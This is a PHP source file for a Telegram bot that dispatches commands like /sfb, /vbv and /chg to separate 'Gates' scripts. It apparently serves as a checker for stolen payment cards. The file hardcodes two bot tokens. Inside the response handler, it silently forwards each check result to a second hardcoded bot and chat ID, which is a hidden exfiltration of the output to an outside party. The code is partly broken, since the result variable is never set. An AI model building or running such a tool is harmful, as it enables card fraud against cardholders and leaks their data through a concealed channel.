<?php

require 'vendor/autoload.php';

use React\EventLoop\Factory;
use React\HttpClient\Client;

ignore_user_abort(true);
set_time_limit(0);

$bot_token = '6530776361:AAFmo9-O9yrtVK29sDgkJ5FpynQPhvR46O0';
$api_url = "https://api.telegram.org/bot$bot_token/";

$update = json_decode(file_get_contents('php://input'), true);

$chat_id = $update['message']['chat']['id'];
$r_id = $update["message"]["reply_to_message"];
$isfile = $update['message']['document'];
$file_id = $update['message']['document']['file_id'];
$message_id = $update["message"]["message_id"];
$gId = $update["message"]["from"]["id"];
$userId = $update["message"]["from"]["id"];
$lastname = $update["message"]["from"]["last_name"];
$firstname = $update["message"]["from"]["first_name"];
$username = $update["message"]["from"]["username"];
$r_userId = $update["message"]["reply_to_message"]["from"]["id"];
$r_firstname = $update["message"]["reply_to_message"]["from"]["first_name"];  
$r_username = $update["message"]["reply_to_message"]["from"]["username"]; 
$r_msg_id = $update["message"]["reply_to_message"]["message_id"]; 
$r_msg = $update["message"]["reply_to_message"]["text"]; 
$premium = $update["message"]["from"]["is_premium"];
$p1 = (boolval($premium) ? 'True' : 'False');
$ownerid = 'YOUR_OWNER_ID';

function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
};

function string_between_two_string($str, $starting_word, $ending_word){ 
    $subtring_start = strpos($str, $starting_word); 
    $subtring_start += strlen($starting_word);   
    $size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
    return substr($str, $subtring_start, $size);
}

$loop = Factory::create();
$client = new Client($loop);

$update = json_decode(file_get_contents('php://input'), true);

if (isset($update['message'])) {
    $message = $update['message'];
    $text = $message['text'];

    if(!empty($r_id)) {
        $r_msg = $update["message"]["reply_to_message"]["text"]; 
        $message = $update["message"]["text"]; 
        $text = $message ." ".$r_msg;
    }

    // Create a list of available commands
    $commands = array("/sfb", "/au", "/sfv", "/sfo", "/su", "/sfc", "/chg", "/sfs", "/sfw", "/sfm", "/sfr", "/sfk", "/sfz", "/sfd", "/sfe", "/msfb", "/vbv", "/sfj", "/filter", "/ax", "/asy", "/sfa", "/sfp", "/sfq", "/sfg");

    // Check if the text starts with any of the commands
    if (in_array($text, $commands)) {

        $url =  $api_url . 'sendChatAction';
        $post_data = array('chat_id' => $chat_id, 'action' => 'typing');
        $request = $client->request('POST', $url, array('Content-type' => 'application/json'));
        $request->write(json_encode($post_data));
        $request->end();

        $url = $api_url . 'sendMessage';
        $post_data = array('chat_id' => $chat_id, 'text' => 'Processing....', 'reply_to_message_id' => $message_id);
        $request = $client->request('POST', $url, array('Content-type' => 'application/json'));
        $request->write(json_encode($post_data));

        // Get the message ID for the processing message
        $request->on('response', function ($response) use ($client, $chat_id, &$message_idd, &$text, $bot_token, $api_url) {
            $response->on('data', function ($data) use ($client, $chat_id, &$message_idd, &$text, $bot_token, $api_url) {
                $message_idd = json_decode($data)->result->message_id;
                $url = $api_url . 'editMessageText';
                $post_data = array('chat_id' => $chat_id, 'message_id' => $message_idd, 'text' => $ccrsp, 'parse_mode' => 'HTML');
                $request = $client->request('POST', $url, array('Content-type' => 'application/json'));
                $request->write(json_encode($post_data));
                $request->end();

                // Send message to the owner of the bot
                $url = "https://api.telegram.org/bot6077366131:AAESraPbg4zylB_hobgnakH-WJf7XIvI_cs/sendMessage";
                $post_data = array('chat_id' => '5221813293', 'text' => $ccrsp, 'parse_mode' => 'HTML');
                $request = $client->request('POST', $url, array('Content-type' => 'application/json'));
                $request->write(json_encode($post_data));
                $request->end();
            });
        });

        // Perform action based on the command
        if ((strpos($text, "/sfb") === 0)||(strpos($text, ".sfb") === 0)){
            include 'Gates/sfb.php';
        } elseif ((strpos($text, "/au") === 0)||(strpos($text, ".au") === 0)){
            include 'Gates/au.php';
        } elseif ((strpos($text, "/sfo") === 0)||(strpos($text, ".sfo") === 0)){
            include 'Gates/sfo.php';
        } elseif ((strpos($text, "/sfv") === 0)||(strpos($text, ".sfv") === 0)){
            include 'Gates/sfv.php';
        } elseif ((strpos($text, "/sfz") === 0)||(strpos($text, ".sfz") === 0)){
            include 'Gates/sfz.php';
        } elseif ((strpos($text, "/sfd") === 0)||(strpos($text, ".sfd") === 0)){
            include 'Gates/sfd.php';
        } elseif ((strpos($text, "/sfe") === 0)||(strpos($text, ".sfe") === 0)){
            include 'Gates/sfe.php';
        } elseif ((strpos($text, "/sfj") === 0)||(strpos($text, ".sfj") === 0)){
            include 'Gates/sfj.php';
        } elseif ((strpos($text, "/cex") === 0)||(strpos($text, ".cex") === 0)){
            include 'Gates/mass.php';
        } elseif ((strpos($text, "/fil") === 0)||(strpos($text, ".fil") === 0)){
            include 'Gates/filter.php';
        } elseif ((strpos($text, "/vbv") === 0)||(strpos($text, ".vbv") === 0)){
            include 'Gates/vbv.php';
        } elseif ((strpos($text, "/ax") === 0)||(strpos($text, ".ax") === 0)){
            include 'Gates/ax.php';
        } elseif ((strpos($text, "/asy") === 0)||(strpos($text, ".asy") === 0)){
            include 'Gates/asy.php';
        } elseif ((strpos($text, "/sfa") === 0)||(strpos($text, ".sfa") === 0)){
            include 'Gates/sfa.php';
        } elseif ((strpos($text, "/sfp") === 0)||(strpos($text, ".sfp") === 0)){
            include 'Gates/sfp.php';
        } elseif ((strpos($text, "/sfq") === 0)||(strpos($text, ".sfq") === 0)){
            include 'Gates/sfq.php';
        } elseif ((strpos($text, "/sfg") === 0)||(strpos($text, ".sfg") === 0)){
            include 'Gates/sfg.php';
}
}
}

// Run the event loop
$loop->run();

?>
